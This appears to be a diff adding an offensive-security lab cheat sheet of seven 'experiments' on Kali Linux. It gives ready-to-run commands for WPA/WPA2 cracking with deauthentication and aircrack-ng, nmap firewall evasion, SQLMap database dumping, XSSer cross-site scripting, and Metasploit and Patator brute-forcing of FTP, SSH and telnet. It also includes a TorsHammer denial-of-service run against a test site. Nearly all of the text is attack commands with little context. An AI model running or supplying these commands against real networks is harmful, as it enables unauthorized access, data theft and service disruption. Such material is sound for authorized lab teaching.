@@ -1,0 +1,78 @@
+EXP - 3  WPA/WPA2 Cracking Using Kali Linux
+1. Check your wireless interface. => ifconfig
+2. Stop all interfering processes. => airmon-ng check kill
+3. Enable monitor mode on your WiFi adapter. => airmon-ng start wlan0
+4. Scan all nearby WiFi networks. => airodump-ng wlan0mon
+5. Capture handshake from the target network. => airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
+6. Disconnect clients to force a handshake. => aireplay-ng -0 10 -a [BSSID] wlan0mon
+7. Crack the WiFi password using a wordlist.=> aircrack-ng capture-01.cap -w /path/to/wordlist.txt
+8. View the cracked password in the terminal.
+Result:
+- Password will be shown if successfully cracked.
+=================================================================================================
+EXP 4: Automatic Wireless Network Cracking Using Kali Linux 
+1.Check available wireless interfaces on your system. This command lists your network interfaces to identify the WiFi adapter (usually wlan0). => ifconfig
+2.Monitor mode enables your adapter to listen to all wireless traffic nearby. => airmon-ng start wlan0
+3.Scan all nearby WiFi networks (channel hopping). This command continuously switches channels to detect all access points in range. => airodump-ng wlan0mon
+4.Target a specific WiFi network and capture handshake. Lock onto one access point, capture handshake data, and save it to a file. => airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
+5.Disconnect clients to force a handshake. Sends deauth packets to make users reconnect, which triggers a WPA handshake. => aireplay-ng -0 10 -a [BSSID] wlan0mon
+6.Wait until WPA handshake is captured. No command needed. Look for “WPA Handshake” in the top-right of airodump. => [No command, visual confirmation]
+7.Stop monitor mode after capturing the handshake. Return your adapter to managed mode for normal network usage. => airmon-ng stop wlan0mon
+8.Crack the WiFi password using a wordlist. Attempts to decrypt the handshake using a dictionary attack with your wordlist. => aircrack-ng capture-01.cap -w /path/to/wordlist.txt
+==============================================================
+EXP 5: Bypassing Firewalls Using Nmap in Kali Linux
+1.Fragmented Packets (-f) => nmap -f <target IP>
+2. Source Port Manipulation ( — source-port) => nmap --source-port 53 <target IP>
+3. Decoy Scanning (-D)=>nmap -D RND:10 <target IP>
+4. Idle Scan (-sI) => nmap -sI <zombie IP> <target IP>
+5. TCP ACK Scan (-sA) => nmap -sA <target IP>
+==================================================================
+EXP 6 SQL Injection Attack Using SQLMap
+1.List Available Databases. Use SQLMap to test if the website is vulnerable and list accessible databases. => sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+2List Tables in a Targeted Database. Specify the database name with -D and retrieve table names using the --tables option. => sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+3.List Columns in a Target Table. Provide the table name using -T and list all columns using the --columns flag. => sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
+4.Dump Data from Specific Columns. Use -C to specify columns and --dump to extract data from the table. => sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump
+====================================================================
+EXP 7: Cross-Site Scripting (XSS) Attack Using XSSer
+1. git clone https://github.com/epsylon/xsser.git 
+2. cd xsser
+3.python xsser -u "http://testasp.vulnweb.com" \
+-g "Search.asp?tfSearch=XSS" \
+--proxy "http://127.0.0.1:8118" \
+--referer "666.666.666.666" \
+--user-agent "correct audit" \
+-s
+4.xsser -u 'https://target.com' -g '/path/profile.php?username=bob&surname=XSS&age=X1S&job=XSS'
+5.xsser -u 'https://target.com/login.php' -p 'username=bob&password=XSS&captcha=X1S'
+======================================================================
+EXP 8: Brute Force Attack Using Metasploit and Patator
+STEP 1: FTP Brute Force
+1.msfconsole
+2.use auxiliary/scanner/ftp/ftp_login
+3.set PASS_FILE /home/kali/Downloads/rockyou.txt
+4.set RHOSTS <Metasploit ip>
+5.run
+STEP 2:
+1.msfconsole
+2.use auxiliary/scanner/ssh/ssh_login
+3.set PASS_FILE /home/kali/Downloads/rockyou.txt
+4.set RHOSTS <Metasploit ip>
+5.run
+STEP 3:
+1.use auxiliary/scanner/telnet/telnet_login
+2.set USER_FILE /home/kali/Downloads/ssh-usernames.txt
+3.set PASS_FILE /home/kali/Downloads/rockyou.txt
+4.set RHOSTS <Metasploit ip>
+5.run
+STEP 4:
+1.sudo apt update
+2.sudo apt install patator
+3.patator ssh_login host=192.168.221.45 user=FILE0 password=FILE1 0=ssh-usernames.txt 1=rockyou.txt
+======================================================================
+EXP 9: DDOS attack using TorsHammer tool
+1.git clone https://github.com/dotfighter/torshammer.git
+2.cd torshammer
+3.ls
+4.python2 torshammer.py -t testphp.vulnweb.com -p 80 -r 5000
+5.python2 torshammer.py -t testphp.vulnweb.com -p 80 -r 5000 -T
+========================================================================
